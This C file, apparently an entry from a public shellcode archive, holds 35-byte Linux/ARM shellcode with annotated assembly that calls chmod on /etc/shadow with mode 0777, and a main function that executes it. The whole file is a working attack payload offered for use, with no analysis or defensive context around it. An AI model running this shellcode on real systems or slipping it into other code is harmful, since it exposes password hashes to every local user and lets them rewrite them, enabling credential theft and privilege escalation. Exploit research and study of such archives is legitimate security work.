/*
| Title: Linux/ARM chmod("/etc/shadow", 0777) Shellcode 35 Bytes
| Type: Shellcode
| Author: Florian Gaultier <florian.gaultier@shell-storm.org>
| Platform: Linux ARM (ARM926EJ-S rev 5 (v51))
| [+] http://www.shell-storm.org
*/

#include <stdio.h>


char shellcode[] = "\x01\x60\x8f\xe2" // add r6, pc, #1
"\x16\xff\x2f\xe1" // bx r6
"\x78\x46" // mov r0, pc
"\x0c\x30" // adds r0, #12
"\xff\x21" // movs r1, #255
"\xff\x31" // adds r1, #255
"\x0f\x27" // movs r7, #15
"\x01\xdf" // svc 1
"\x01\x27" // movs r7, #1
"\x01\xdf" // svc 1
"/etc/shadow";

int main()
{
(*(void(*)()) shellcode)();

return 0;
}